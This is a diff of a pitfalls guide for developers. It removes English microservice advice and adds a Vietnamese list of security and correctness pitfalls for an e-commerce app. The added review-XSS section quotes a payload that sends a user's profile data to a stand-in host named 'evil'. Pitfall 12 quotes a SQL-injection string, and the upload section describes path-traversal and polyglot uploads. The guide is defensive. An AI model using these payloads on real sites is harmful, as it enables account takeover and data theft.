-    - Product name changed → Product service emits "ProductUpdated" event
-    - All services listening invalidate product cache
-  - **Dependency tracking:** Cache knows dependencies; invalidates on change
-    - Order cache depends on Inventory cache; if inventory changes, order cache invalidated
-- **Cache key design:** Ensure cache key includes all parameters affecting result
-  - Bad: `cache_key = "orders"` (shared across all requests)
-  - Good: `cache_key = "orders_{userId}_{sortBy}"` (unique per user and sort)
-- **Cache warming:** Pre-load cache on startup
-  - Popular products, frequently-accessed customers
-  - Reduces cold-start latency
-- **Cache stampede prevention:**
-  - When cache expires, 1000s of requests hit database simultaneously (stampede)
-  - Use lock: first request refreshes; others wait for result
-  - Or: refresh cache before expiry (background job)
-- **HTTP caching:** Leverage browser/CDN caching
-  - Set Cache-Control headers on read-only data
-  - `Cache-Control: public, max-age=300` (cache 5 minutes)
-  - Clients cache responses; reduce server load
-
-**Which phase to address:**
-- **Performance optimization:** Add caching when queries/calls identified as bottleneck
-- **Load testing:** Measure database load; add caching if high
-
----
-
-### Pitfall 16: Missing Async Operations
-
-**What goes wrong:**  
-All operations synchronous. Payment processing waits for email sending. Email slow? Payment API slow. User waits 30 seconds for order confirmation (5s payment + 25s email).
-
-**Why it happens:**
-- Simplicity mindset: synchronous is easier than async
-- Unfamiliarity with async patterns (event-driven, messaging)
-- Tight coupling of unrelated operations
-
-**Consequences:**
-- Latency high (wait for all serial operations)
-- Bottleneck on slowest operation (email provider latency)
-- Tight coupling (payment system depends on email system)
-- Timeout failures (operation takes too long)
-
-**Warning signs:**
-- API response time = sum of all downstream operation times
-- Email or notification system failures cause order failures
-- Latency P99 >> P50 (some requests slow because waiting for async operation)
-- Request timeout; operation partially completed
-- "Important operations" fail if unrelated service is down
-
-**Prevention:**
-- **Async for non-critical operations:**
-  - Create order (synchronous) → return order ID immediately
-  - Send confirmation email (asynchronous) → processed in background
-  - Send push notification (asynchronous) → processed in background
-  - Update analytics (asynchronous) → processed in background
-- **Event-driven architecture:**
-  - Order Service publishes "OrderCreated" event
-  - Email Service listens; sends confirmation email
-  - Analytics Service listens; updates dashboard
-  - Services decoupled; each handles independently
-- **Message queue (FIFO, at-least-once delivery):**
-  - Producer (Order Service) publishes event to queue
-  - Consumer (Email Service) processes from queue
-  - Guaranteed delivery; can retry on failure
-  - Example: RabbitMQ, AWS SQS, Apache Kafka
-- **Background jobs (scheduled async):**
-  - Batch processing: every hour, compute overnight analytics
-  - Cleanup: delete old logs; archive old orders
-  - Example: Spring @Scheduled, Quartz, AWS Lambda
-- **User feedback:**
-  - Synchronous: "Email sent" (user sees result immediately)
-  - Asynchronous: "Confirmation sent (typically <2 minutes)" (user understands delay)
-  - Or: webhook/polling to get result asynchronously
-- **Timeout handling:**
-  - Non-critical operation timeout? Use sensible default instead of failing
-  - Send order confirmation email; if timeout, still confirm order (retry email later)
-
-**Which phase to address:**
-- **Architecture phase:** Design critical vs non-critical operations
-- **Every operation:** Consider if synchronous or async is appropriate
-
----
-
-### Pitfall 17: Database Query Optimization Neglect
-
-**What goes wrong:**  
-Services execute unoptimized queries. N+1 queries, full table scans, missing indexes. Database CPU maxes; query latency explodes.
-
-**Why it happens:**
-- No query analysis during development (focus on correctness)
-- ORM generates inefficient SQL (N+1 problem)
-- Missing indexes (not obvious which queries are slow)
-- Test data small; doesn't expose slowness until production
-
-**Consequences:**
-- Database CPU bottleneck (maxes at 80-90%)
-- Query timeouts (exceed database timeout)
-- Slow response times affect all services
-- Cascading failures (services timeout waiting for DB)
-- Expensive hardware spend to handle load
-
-**Warning signs:**
-- Database CPU high; response times slow
-- Query logs show same query executed repeatedly
-- Full table scans on large tables (logs show seq scan)
-- Missing indexes on frequently-queried columns
-- ORM generates N+1 queries for relationships
-
-**Prevention:**
-- **EXPLAIN ANALYZE queries:** Understand query execution plan
-  - Identify seq scans (slow) vs index scans (fast)
-  - Identify join strategies (hash join vs nested loop)
-  - Identify estimated vs actual rows (plan accuracy)
-- **Index frequently-queried columns:**
-  - `CREATE INDEX idx_orders_user_id ON orders(user_id)`
-  - Queries on user_id become 10-100× faster
-  - But: every index has write cost; only index needed columns
-- **Avoid N+1 queries:**
-  - Instead of loop + query, use JOIN or batch query
-  - JPA: use `FETCH JOIN` or batch size configuration
-  - Manual SQL: use JOINs to fetch all data in one query
-- **Optimize ORM usage:**
-  - Eager load (FETCH JOIN) for needed relationships
-  - Don't lazy load in loops
-  - Use projections (select only needed columns)
-- **Denormalization:** Store precomputed values to avoid joins
-  - Order record includes `total_amount` (denormalized from order items)
-  - Queries don't need JOIN to items table
-  - Event updates total_amount when items change
-- **Partitioning:** For large tables, partition by date/range
-  - `orders` table partitioned by month
-  - Queries on recent orders hit small partition (fast)
-- **Monitoring:** Log slow queries automatically
-  - PostgreSQL: `log_min_duration_statement = 1000` (log queries > 1s)
-  - Set alert on slow query count spike
-
-**Which phase to address:**
-- **Load testing:** Identify slow queries under realistic load
-- **Monitoring setup:** Enable slow query logging in production
-
----
-
-## DEVELOPMENT PITFALLS
-
-### Pitfall 18: Complex Local Development Setup
-
-**What goes wrong:**  
-To run application locally, developer must run 10+ services (Order, Inventory, Customer, Payment, etc.), databases, message brokers, caches. Setup takes hours; Docker config outdated; integration broken.
-
-**Why it happens:**
-- Microservices require many components
-- No single docker-compose or orchestration for full stack
-- Documentation out of sync with actual services
-- Each service team maintains setup independently
-
-**Consequences:**
-- New developer onboarding: 2+ days of setup instead of 30 minutes
-- Services not running locally? Developers can't test; bugs found in CI
-- Developers skip local testing; rely on CI (slow feedback loop)
-- Setup breaks with each service change; frustration
-- Integration tests can't run locally
-
-**Warning signs:**
-- Developer doc is 50+ pages of setup steps
-- "Just use staging; your setup probably won't work"
-- docker-compose.yml references services that don't exist
-- Frequent issues: "works for me" → "doesn't work for you"
-- Integration tests only in CI; not run locally
-
-**Prevention:**
-- **docker-compose.yml for full stack:**
-  - Include all services: order, inventory, customer, payment, auth
-  - Include dependencies: PostgreSQL, Redis, RabbitMQ, Elasticsearch
-  - Single command: `docker-compose up` starts everything
-- **Service stubs/mocks for optional services:**
-  - Don't need all services; stub the ones not being developed
-  - Inventory Service stub returns fake data (no real service needed)
-  - Only run Order Service + dependent services for feature work
-- **Script setup:**
-  ```bash
-  ./scripts/dev-setup.sh
-  # Installs dependencies, starts containers, runs migrations
-  # Single command; developer ready in 5 minutes
-  ```
-- **Database migrations on startup:**
-  - Service auto-applies pending migrations on startup
-  - No manual schema setup needed
-- **Pre-populated test data:**
-  - docker-compose.yml seeds databases with test users, products
-  - Developer immediately has data to work with
-- **Troubleshooting guide:**
-  - Common issues and solutions documented
-  - "Containers won't start?" → "check `docker ps`; restart with `docker-compose restart`"
-- **Makefile for common tasks:**
-  ```makefile
-  setup:     docker-compose up -d
-  test:      gradle test
-  logs:      docker-compose logs -f
-  clean:     docker-compose down -v
-  ```
-
-**Which phase to address:**
-- **MVP setup:** Establish docker-compose and setup docs from day 1
-- **Onboarding:** Test setup process with new developer
-
----
-
-### Pitfall 19: Incomplete Error Handling
-
-**What goes wrong:**  
-Services don't handle errors properly. Service call fails; error not caught; exception propagates; user sees 500 error. Or: error swallowed; operation silently fails.
-
-**Why it happens:**
-- Focus on happy path (works when everything succeeds)
-- Lazy error handling (catch Exception; print stack trace)
-- Async errors unobserved (background job fails; no one knows)
-- Retry logic missing
-
-**Consequences:**
-- User experience broken (500 errors on failed operations)
-- Silent failures (operation appears to succeed, but didn't)
-- Cascading failures (error not caught; propagates to caller)
-- Hard to debug (error context lost)
-- Data corruption (partial failure; state inconsistent)
-
-**Warning signs:**
-- Stack traces in logs with no action taken
-- "Works sometimes; fails sometimes" (unhandled race conditions)
-- User data missing (operation appeared to succeed)
-- No error messages; just "Request failed"
-- Async job failures unnoticed (background job log ignored)
-
-**Prevention:**
-- **Explicit error handling:**
-  ```java
-  try {
-    inventory.reserve(order.items);
-  } catch (OutOfStockException e) {
-    order.status = "FAILED";
-    order.error = "Out of stock: " + e.getMessage();
-    return orderResponse;  // Explicit error to user
+- Next.js `config.matcher` semantics: `/profile/:path*` match `/profile/x/y` nhưng KHÔNG match `/profile` (cần `/profile/:path*` + `/profile` riêng, hoặc `/profile{/:path*}?` với named groups — phụ thuộc Next version).
+- middleware.ts chạy trên **edge runtime** → cẩn thận với JWT verify (jose library OK, jsonwebtoken KHÔNG OK trên edge).
+- v1.1 compensating control là `http.ts` 401 redirect — đã có incident login redirect loop khi redirect áp dụng cho cả endpoint `/api/users/auth/login` chính nó.
+
+**How to avoid:**
+- Matcher pattern explicit cover root + nested:
+  ```ts
+  export const config = {
+    matcher: [
+      '/admin/:path*', '/admin',
+      '/profile/:path*', '/profile',
+      '/account/:path*', '/account',
+      '/checkout/:path*', '/checkout',
+    ],
   }
   ```
-- **Fallback/default behavior:**
-  - Service call fails? Use cached/default value
-  - Email sending fails? Log for retry; order still created
-  - Analytics service slow? Skip analytics; don't slow down order
-- **Retry with exponential backoff:**
-  ```java
-  ExponentialBackoffRetry retry = new ExponentialBackoffRetry(
-    baseDelay: 100ms,
-    maxDelay: 30s,
-    maxAttempts: 3
-  );
-  ```
-- **Circuit breaker (detect failures early):**
-  - After N failures, fail immediately instead of retrying
-  - Gives service time to recover
-- **Logging context:**
-  - Log error with context: user ID, order ID, operation
-  - Not just exception message; full context for debugging
-- **Async error handling:**
-  - Background jobs must log success/failure
-  - Failed jobs go to dead-letter queue for review
-  - Alert on job failure
-- **User-facing error messages:**
-  - Generic error to user (don't expose internals)
-  - Specific error in logs (for debugging)
-  - Example: User sees "Order creation failed. Retry or contact support."
-  - Logs show "PaymentService connection timeout; exceeded max retries"
-
-**Which phase to address:**
-- **Every API:** Implement error handling for each endpoint
-- **Testing:** Test error cases, not just happy path
-
----
-
-### Pitfall 20: Poor Observability and Logging
-
-**What goes wrong:**  
-Services run in production; something fails; engineer can't determine what happened. No logs, no traces, no metrics. "It worked yesterday; don't know why it's failing now."
-
-**Why it happens:**
-- Observability afterthought (not built in from start)
-- Too much logging (logs too noisy; important messages hidden)
-- Too little logging (not enough context)
-- Logs not correlated (can't trace request across services)
-- No alerting (failures not noticed until users complain)
-
-**Consequences:**
-- MTTR (mean time to recovery) very high (hours to determine issue)
-- Silent failures (service degraded; not detected)
-- Difficult debugging (can't recreate production issues)
-- Blind operations (no visibility into system)
-- Reactionary (fixes bugs after users report)
+- KHÔNG include `/api/users/auth/*` vào matcher (auth endpoints phải public).
+- Test matcher bằng unit test với mock `NextRequest`.
+- Verify SSR direct visit (curl với cookie chưa set) → `/profile` phải redirect 307 sang `/login?returnTo=%2Fprofile`.
 
 **Warning signs:**
-- "Let me SSH into production and check logs" (should be accessible from monitoring dashboard)
-- When service is slow, engineer says "I don't know; restart it"
-- No correlation ID in logs (can't trace request across services)
-- Dashboard shows error rate but not root cause
-- Incidents resolved by "restart the service"
+- DevTools Network: middleware chạy cho `/_next/static/...` (lớn delay TTFB).
+- User trực tiếp paste `/profile` URL vẫn load được (chỉ data client-side fail).
+- Login redirect loop tái xuất hiện (audit `AUTH_PATHS_NO_REDIRECT` trong http.ts vẫn còn).
 
-**Prevention:**
-- **Three pillars of observability:** logs, metrics, traces
-- **Distributed tracing:**
-  - Assign unique trace ID to each request
-  - Trace ID passed to all services in call chain
-  - All logs include trace ID (can search logs for request)
-  - Example: Spring Cloud Sleuth + Zipkin
-  ```
-  Trace ID: abc123
-  Service A: 2ms
-    └─ Service B: 8ms
-      └─ Service C: 5ms (timed out after 10ms)
-  Total: slow due to timeout in Service C
-  ```
-- **Structured logging (JSON):**
-  - Not: `Order created for user john with total 100`
-  - But: `{"event": "order_created", "user_id": "john", "amount": 100, "trace_id": "abc123"}`
-  - Enables parsing, searching, aggregation
-- **Log levels appropriately:**
-  - ERROR: failures requiring action (payment failed, database down)
-  - WARN: degraded but functioning (retry attempt #3, slow query)
-  - INFO: important events (user login, order created)
-  - DEBUG: detailed flow (entering function, variable values) — usually disabled in production
-- **Metrics (quantitative):**
-  - Request count per service
-  - Request latency (p50, p95, p99)
-  - Error rate per endpoint
-  - Database query count
-  - Cache hit rate
-  - Alert on anomalies (error rate spike, latency spike)
-- **Dashboards:**
-  - System overview: all services status, error rates, latencies
-  - Service detail: requests, errors, latencies, dependencies
-  - Business metrics: orders per minute, payment success rate
-  - Updated in real-time; engineer can see issues immediately
-- **Log aggregation:**
-  - Logs from all services sent to central location (Elasticsearch, Splunk)
-  - Searchable across all services
-  - Long-term storage (30+ days)
-- **Alerting on critical issues:**
-  - Error rate > 5% → page on-call engineer
-  - P99 latency > 10s → alert
-  - Service down → page immediately
-  - Smart alerting (don't alert on transient issues; wait for sustained)
-- Reference: [Distributed tracing pattern](https://microservices.io/patterns/observability/distributed-tracing.html), [Log aggregation pattern](https://microservices.io/patterns/observability/application-logging.html)
-
-**Which phase to address:**
-- **MVP:** Set up distributed tracing + log aggregation from day 1
-- **Every service:** Include trace ID in all logs
-- **Load testing:** Verify observability works under load
+**Phase to address:** Phase 9 (residual closure — AUTH-06). Verification: Playwright test `direct-visit-protected-route.spec.ts`.
 
 ---
 
-### Pitfall 21: Missing Tests (Unit, Integration, Contract)
+### Pitfall 3: Reviews — XSS qua review content (rich text / markdown)
 
-**What goes wrong:**  
-Services deployed without tests. Service A changes API; Service B still expects old format; integration breaks. Or: service has bug; no test catches it.
+**What goes wrong:**
+User submit review chứa `<script>alert(1)</script>` hoặc `<img src=x onerror=fetch('/api/users/me').then(r=>r.json()).then(d=>fetch('//evil',{method:'POST',body:JSON.stringify(d)}))>`. Nếu FE render bằng `dangerouslySetInnerHTML` (vì muốn support **kbd**, line break, link) → stored XSS, kẻ tấn công đọc được session/JWT từ localStorage của user khác xem review.
 
 **Why it happens:**
-- Pressure to ship quickly (skip tests to save time)
-- Integration testing hard (depends on other services)
-- No consumer-driven contracts (API changes not validated against consumers)
-- Testing cost unclear (perceived as overhead)
+- Reviews UI thường muốn format nhẹ (line break, link) → developer reach for `dangerouslySetInnerHTML` thay vì `<p>{content}</p>` (React tự escape).
+- Backend Spring Boot Jackson tự escape JSON nhưng KHÔNG sanitize HTML — nó echo lại đúng input.
+- Project dùng JWT trong localStorage (xác nhận từ AUTH-05 v1.1) → XSS = full account takeover.
 
-**Consequences:**
-- Bugs found in production (not development)
-- API changes break consumers (coordinated deployments needed)
-- Regression bugs (working feature breaks with change)
-- High MTTR (hours to fix; had tests would have caught it in minutes)
+**How to avoid:**
+- **FE:** Render plain text (`{content}` trong JSX). Nếu cần line break: `content.split('\n').map(...)`. Nếu cần markdown: dùng `react-markdown` với `disallowedElements=['script','iframe','style']` và `unwrapDisallowed=true`.
+- **BE (defense in depth):** Sanitize trong `ReviewEntity.@PrePersist` bằng OWASP Java HTML Sanitizer: `Sanitizers.FORMATTING.and(Sanitizers.LINKS).sanitize(content)`.
+- **Validation:** Length cap 2000 chars, reject nếu match `/<\s*(script|iframe|object|embed)/i`.
+- Migrate JWT từ localStorage sang httpOnly cookie là invisible hardening → defer (per project policy), nhưng XSS vẫn nguy hiểm cho session token nên sanitize là MUST.
 
 **Warning signs:**
-- Service has <50% code coverage
-- Integration tests don't exist ("too hard; use staging")
-- New API version breaks existing clients
-- Same bug appears multiple times (no test prevents regression)
-- Deployment requires coordinated release (breaking change)
+- Code review thấy `dangerouslySetInnerHTML={{__html: review.content}}`.
+- Review content lưu raw có ký tự `<` `>` không escape ở DB.
+- E2E test viết: `await page.fill('textarea[name=content]', '<b>bold</b>')` rồi assert text — cần thêm assertion KHÔNG có element `<b>` thực.
 
-**Prevention:**
-- **Unit tests:** Test service logic in isolation
-  - Test order calculation, discount logic, validation
-  - Mock dependencies (database, other services)
-  - Goal: >80% code coverage of business logic
-  ```java
-  @Test
-  void calculateTotal_appliesDiscount() {
-    Order order = new Order();
-    order.addItem(new Product("Widget", 100), 2);
-    order.setDiscount(0.1);  // 10% discount
-    assertEquals(180, order.calculateTotal());  // 2 * 100 - 20
-  }
+**Phase to address:** Phase planning Reviews feature. Verification: Playwright XSS payload test + manual paste OWASP XSS cheat sheet payloads.
+
+---
+
+### Pitfall 4: Reviews — Rating average drift on edit/delete (denormalized count + sum)
+
+**What goes wrong:**
+Naïve approach: lưu `Product.averageRating` + `Product.reviewCount` denormalized trên ProductEntity, update trong `ReviewService.create()` bằng `product.averageRating = (avg*count + newRating) / (count+1)`. Khi user **edit** review từ 5 sao xuống 1 sao, code chỉ +1 cho count mới hoặc bỏ qua → average drift dần khỏi truth. Khi **delete** review, nếu race condition 2 delete song song, count có thể trừ 2 lần.
+
+**Why it happens:**
+- Floating point drift sau nhiều update — không bao giờ khớp lại với SUM/COUNT thực.
+- Edit flow developer thường viết: `update review.rating; recalculate using formula` thay vì recompute từ scratch.
+- Race condition: 2 transactions cùng đọc `averageRating=4.5, count=100`, cùng tính rồi cùng write → một update bị mất (lost update).
+
+**How to avoid:**
+- **Option A (recommended cho MVP):** KHÔNG denormalize. Tính on-the-fly: `SELECT AVG(rating), COUNT(*) FROM reviews WHERE product_id = ?`. Cache 60s in-memory hoặc Redis nếu có. Đơn giản, không drift.
+- **Option B (nếu cần performance):** Denormalize nhưng dùng SQL trigger hoặc `@PostPersist/@PostUpdate/@PostRemove` recompute từ scratch:
+  ```sql
+  UPDATE products SET avg_rating = (SELECT AVG(rating) FROM reviews WHERE product_id = ?),
+                       review_count = (SELECT COUNT(*) FROM reviews WHERE product_id = ?)
+  WHERE id = ?;
   ```
-- **Integration tests:** Test service with real dependencies
-  - Start real database; run actual SQL queries
-  - Test with message broker; ensure messages consumed
-  - Goal: test happy path + error cases per endpoint
-  ```java
-  @Test
-  void createOrder_persists_and_publishesEvent() {
-    Order order = orderService.createOrder(customerId, items);
-    
-    // Verify order in database
-    Order persisted = orderRepository.findById(order.id);
-    assertNotNull(persisted);
-    
-    // Verify event published
-    ArgumentCaptor<OrderCreatedEvent> captor = ArgumentCaptor.forClass(...);
-    verify(eventPublisher).publish(captor.capture());
-    assertEquals(order.id, captor.getValue().getOrderId());
-  }
+  Bọc trong `@Transactional(isolation = REPEATABLE_READ)` hoặc dùng `SELECT ... FOR UPDATE` trên products row.
+- **Option C:** Event-sourced — append-only ratings table, materialized view refresh nightly. Overkill cho project này.
+
+**Warning signs:**
+- `averageRating` có giá trị `4.4999999...` hoặc `5.0000001` (floating point drift).
+- Test scenario: tạo 10 review 5 sao → edit 1 review xuống 1 sao → delete cùng review → assert avg = 5.0 với 9 review remaining. Naïve impl sẽ fail.
+- N+1: list product page query `SELECT AVG/COUNT` cho mỗi product (100 products = 200 queries).
+
+**Phase to address:** Phase planning Reviews feature. Pick Option A trừ khi benchmark cho thấy product list page > 500ms với 100 products.
+
+---
+
+### Pitfall 5: Reviews — N+1 queries trên product list / detail
+
+**What goes wrong:**
+Product detail page show "5 reviews mới nhất" + average rating + total count. Code naïve: `productRepo.findBySlug(slug)` rồi `reviewRepo.findTop5ByProductIdOrderByCreatedAtDesc(id)` rồi với mỗi review `userRepo.findById(review.userId)` để lấy displayName → 1 + 1 + 5 = 7 queries cho 1 page load. Nhân lên product list (20 products × rating count) = 41 queries.
+
+**Why it happens:**
+- Microservices: review-data sống trong product-service, user displayName sống trong user-service → KHÔNG thể JOIN trực tiếp ở SQL level.
+- JPA `@OneToMany(fetch = LAZY)` mặc định lazy → mỗi access trigger query.
+- Reviewer name "khách hàng ẩn danh" nghe đơn giản nhưng UX yếu → developer cố fetch user-svc.
+
+**How to avoid:**
+- **Denormalize reviewer displayName + avatarUrl vào ReviewEntity** lúc create (snapshot). Nếu user đổi tên sau đó, review hiển thị tên cũ — acceptable cho UX (giống Amazon).
+- Bulk fetch: `reviewRepo.findByProductIdInOrderByCreatedAtDesc(productIds)` cho list page, group ở service layer.
+- Pagination: KHÔNG load all reviews. Default page size 10, infinite scroll hoặc "Load more".
+- Spring Data JPA `@EntityGraph` để eager load nếu cùng service.
+
+**Warning signs:**
+- Spring Boot log với `spring.jpa.show-sql=true`: cùng query lặp 10+ lần per request.
+- Browser Network: product detail TTFB > 800ms.
+- p95 latency tăng linear với số reviews.
+
+**Phase to address:** Phase planning Reviews feature. Verification: enable `show-sql=true` trên dev profile, manual count queries per request type (target: ≤ 3 queries cho product detail).
+
+---
+
+### Pitfall 6: Address book — soft-delete vs hard-delete khi address tham chiếu trong Order
+
+**What goes wrong:**
+v1.1 PERSIST-02 đã ship: order lưu `shippingAddress` JSON snapshot trong `OrderItemEntity` (đúng pattern). v1.2 Address book thêm `AddressEntity` table, user có thể delete address. Naïve hard-delete: `DELETE FROM addresses WHERE id = ?`. Nếu order_v2 (chưa ship) reference address_id qua FK → constraint violation. Nếu KHÔNG có FK (chỉ snapshot JSON) → orphaned reference, admin sau này click "edit shipping address của order" → 404.
+
+**Why it happens:**
+- Developer mới quen pattern reference (`order.shippingAddressId`) thay vì snapshot (`order.shippingAddressJson`).
+- v1.1 đã chọn snapshot pattern (correct), nhưng Address book introduce table mới và developer dễ migrate sang FK reference.
+- Soft-delete (`deleted_at`) làm query phức tạp + cần filter ở mọi list endpoint.
+
+**How to avoid:**
+- **GIỮ snapshot pattern:** Khi user checkout, copy address fields vào `OrderItemEntity.shippingAddress` JSON (đã ship v1.1). KHÔNG tạo FK từ order → address.
+- Address table chỉ là "saved addresses for autofill", KHÔNG phải source of truth cho order.
+- Hard-delete an toàn: `DELETE FROM addresses WHERE id = ?` không ảnh hưởng order vì không FK.
+- UI: confirm modal "Xóa địa chỉ này? Đơn hàng đã đặt KHÔNG bị ảnh hưởng (đã lưu địa chỉ giao hàng riêng)."
+
+**Warning signs:**
+- Schema có `orders.shipping_address_id BIGINT REFERENCES addresses(id)` — sai pattern.
+- Code: `order.getShippingAddress()` query qua AddressRepo thay vì đọc từ JSON column.
+- Khi delete address, app throw FK constraint error.
+
+**Phase to address:** Phase planning Address book. Verification: integration test create order → delete address used → query order → shippingAddress vẫn đầy đủ.
+
+---
+
+### Pitfall 7: Address book — default-flag concurrency
+
+**What goes wrong:**
+User có 3 addresses, address A đang `is_default=true`. User mở 2 tab, tab1 set B làm default (`UPDATE addresses SET is_default=false WHERE user_id=?; UPDATE addresses SET is_default=true WHERE id=B`), tab2 cùng lúc set C. Race: cả 2 unset xong cả 2 set → DB có B và C cùng `is_default=true`. Checkout autofill bốc nhầm.
+
+**Why it happens:**
+- "Exactly one default" không thể enforce bằng simple column constraint trên Postgres.
+- Service code thường viết 2 UPDATE riêng, không atomic.
+
+**How to avoid:**
+- **Partial unique index:** `CREATE UNIQUE INDEX idx_one_default_per_user ON addresses(user_id) WHERE is_default = true;` — Postgres reject second insert/update vào is_default=true cho cùng user.
+- Service code wrap trong `@Transactional` với `SERIALIZABLE` isolation hoặc `SELECT ... FOR UPDATE` lock user row trước.
+- FE optimistic UI: disable button khác trong khi mutation chạy.
+
+**Warning signs:**
+- Khi list addresses thấy 2 row `is_default=true`.
+- Test: Promise.all 2 setDefault concurrent → cả 2 success (không có error).
+- Checkout autofill nhảy giữa các address.
+
+**Phase to address:** Phase planning Address book. Migration V5__address_book.sql phải include partial unique index.
+
+---
+
+### Pitfall 8: Profile editing — password change without old-password verify
+
+**What goes wrong:**
+Endpoint `PATCH /api/users/me` accept `{password: "newpass"}` trực tiếp update qua BCrypt. Nếu attacker steal session token (XSS từ Pitfall 3, hoặc token leak qua logs) → đổi mật khẩu → lockout user vĩnh viễn vì attacker biết password mới còn user thì không.
+
+**Why it happens:**
+- v1.1 AUTH-01..05 build login/register, KHÔNG có change-password flow → developer mới add v1.2 dễ extend `PATCH /me` chung cho mọi field.
+- "Đã authenticated thì cho làm gì cũng được" mindset.
+
+**How to avoid:**
+- Tách endpoint: `PATCH /api/users/me` chỉ cho fullName/phone/avatar, **KHÔNG cho password/email**.
+- `POST /api/users/me/password` require body `{oldPassword, newPassword}`, BE verify oldPassword qua BCrypt match trước khi update.
+- Sau khi đổi password thành công, invalidate tất cả JWT khác của user (cần token version trong claims, hoặc accept rằng JWT cũ vẫn valid đến hết 24h — MVP acceptable nhưng document risk).
+- Rate limit endpoint password change: max 5 attempts / 15 phút.
+
+**Warning signs:**
+- `UserCrudService.update()` accept `passwordHash` trong DTO patch.
+- Swagger schema `UpdateUserRequest` có field `password`.
+- Penetration test: capture JWT, gọi PATCH với password mới, login bằng password mới → success.
+
+**Phase to address:** Phase planning Profile editing. Verification: integration test reject PATCH với password field, success qua dedicated endpoint chỉ khi oldPassword đúng.
+
+---
+
+### Pitfall 9: Profile editing — email change without verification
+
+**What goes wrong:**
+User đổi email thành email của attacker (hoặc typo). System gửi notification về email mới mà không verify → forgot-password flow gửi reset link về email attacker → account takeover. Hoặc user typo email → mất account vĩnh viễn vì không nhận được forgot-password.
+
+**Why it happens:**
+- "Email là PII công khai, đổi tự do" mindset từ developer chưa từng làm production e-com.
+- Notification service đã có (verified v1.0), gửi mail dễ → developer bỏ qua verify step.
+
+**How to avoid:**
+- **Pattern 2-step:** `POST /api/users/me/email/request {newEmail}` → BE generate token, lưu `email_change_pending` table, send link về newEmail. User click link → `GET /api/users/me/email/confirm?token=...` → mới apply.
+- Trong khi pending, login email vẫn là email cũ.
+- **Hoặc đơn giản hơn cho MVP:** Disable email change UI hoàn toàn ở v1.2, nói "Liên hệ admin để đổi email." Document làm tech debt v1.3+.
+
+**Warning signs:**
+- `PATCH /api/users/me` accept email field, không có separate flow.
+- Test: đổi email → forgot-password gửi link đến email mới ngay → verify fail.
+
+**Phase to address:** Phase planning Profile editing. Recommend disable email field cho v1.2 (visible-first priority cho phép defer hardening — đây không phải hardening invisible, đây là protection thật).
+
+---
+
+### Pitfall 10: Profile editing — avatar upload size/MIME bypass
+
+**What goes wrong:**
+FE accept `<input type="file" accept="image/*">` rồi POST multipart. Naïve BE: `MultipartFile.transferTo(path)` không check anything → user upload `.exe`, `.html` (XSS qua avatar URL), 10GB file (DoS), polyglot file (image header + JS payload).
+
+**Why it happens:**
+- `accept="image/*"` chỉ là FE hint, attacker bypass dễ bằng curl.
+- MIME type từ `MultipartFile.getContentType()` đến từ client header — attacker control được.
+- Spring Boot default `spring.servlet.multipart.max-file-size=1MB` nhưng nhiều dev tăng lên 100MB cho "tiện".
+
+**How to avoid:**
+- **Magic byte check (server-side):** Đọc 12 bytes đầu, match với `[0xFF,0xD8,0xFF]` (JPEG), `[0x89,0x50,0x4E,0x47]` (PNG), `[0x47,0x49,0x46,0x38]` (GIF), `[0x52,0x49,0x46,0x46...0x57,0x45,0x42,0x50]` (WebP). Reject mọi thứ khác.
+- Re-encode image qua `ImageIO.read()` + `ImageIO.write()` → strip EXIF, neutralize polyglot.
+- Resize cap max 1024x1024.
+- File size cap 2MB (`spring.servlet.multipart.max-file-size=2MB`).
+- Lưu với random UUID filename, KHÔNG dùng original filename (path traversal).
+- Serve qua endpoint `/api/users/avatar/{userId}` với `Content-Type` ép từ server, KHÔNG serve trực tiếp từ filesystem.
+- KHÔNG store trong `/static/` (nếu store local) — store trong volume riêng để không cache hash.
+
+**Warning signs:**
+- Code: `file.transferTo(new File("uploads/" + file.getOriginalFilename()))` — path traversal.
+- Test upload file `evil.html` → 200 OK → access URL → render HTML.
+- Test upload 50MB file → 200 OK → disk full.
+
+**Phase to address:** Phase planning Profile editing. Verification: penetration test với polyglot/path traversal/oversized payload.
+
+---
+
+### Pitfall 11: Order filtering — date range timezone bugs
+
+**What goes wrong:**
+User Việt Nam (UTC+7) chọn "đơn hàng trong tháng 4/2026". FE gửi `from=2026-04-01&to=2026-04-30`. BE parse `LocalDate` → `2026-04-30 00:00:00 UTC` → query miss đơn đặt lúc 22:00 ngày 30/4 giờ VN (= 15:00 UTC 30/4 — vẫn match) NHƯNG đơn đặt 06:30 sáng 1/5 giờ VN (= 23:30 30/4 UTC) lại match nhầm. Hoặc `to=2026-04-30` exclusive vs inclusive bound — UI hiển thị "đến 30/4" user nghĩ inclusive nhưng code `< to` exclusive.
+
+**Why it happens:**
+- Postgres `TIMESTAMP WITH TIME ZONE` lưu UTC, nhưng Java `LocalDateTime` không carry timezone.
+- Frontend `new Date('2026-04-30').toISOString()` ra `2026-04-30T00:00:00.000Z` (UTC midnight) — dùng làm filter `to` thì miss cả ngày 30/4 giờ VN.
+- Inclusive vs exclusive: `BETWEEN` là inclusive; `< to` là exclusive.
+
+**How to avoid:**
+- **Convention "[from, to)"**: Document rằng `to` là exclusive ngày kế tiếp. UI hiển thị "30/4" → FE compute `to = '2026-05-01'` trước khi gửi.
+- Truyền timezone từ FE: `from=2026-04-01T00:00:00+07:00&to=2026-05-01T00:00:00+07:00`. BE parse `OffsetDateTime` (giữ offset) hoặc convert sang `Instant`.
+- Postgres: `WHERE created_at >= ? AND created_at < ?` với cả 2 là `OffsetDateTime`.
+- Test boundary: đơn lúc 2026-04-30T23:59:59+07:00 phải match khi user filter "tháng 4". Đơn lúc 2026-05-01T00:00:01+07:00 không match.
+
+**Warning signs:**
+- Đơn lúc 23:00 hiển thị ở filter ngày kế tiếp.
+- "Đơn cuối tháng" lúc consistent miss.
+- Code dùng `LocalDate.atStartOfDay()` không có ZoneId.
+
+**Phase to address:** Phase planning Order filtering. Pick `OffsetDateTime` everywhere, document `[from, to)` convention trong OpenAPI spec.
+
+---
+
+### Pitfall 12: Order filtering — query param injection / OpenAPI schema mismatch
+
+**What goes wrong:**
+Naïve impl: `repo.findByStatusAndCreatedAtBetween(status, from, to)` với status là String — Spring Data JPA dùng PreparedStatement nên SQL injection thấp. NHƯNG nếu code build dynamic query bằng `JPQL "SELECT o WHERE o.status = '" + status + "'"` thì injection. Hoặc OpenAPI schema khai báo `status: enum [PENDING,PAID,SHIPPED]` nhưng BE accept any string → FE typed client send đúng nhưng curl gửi `?status=' OR 1=1 --` được (defense in depth fail).
+
+**Why it happens:**
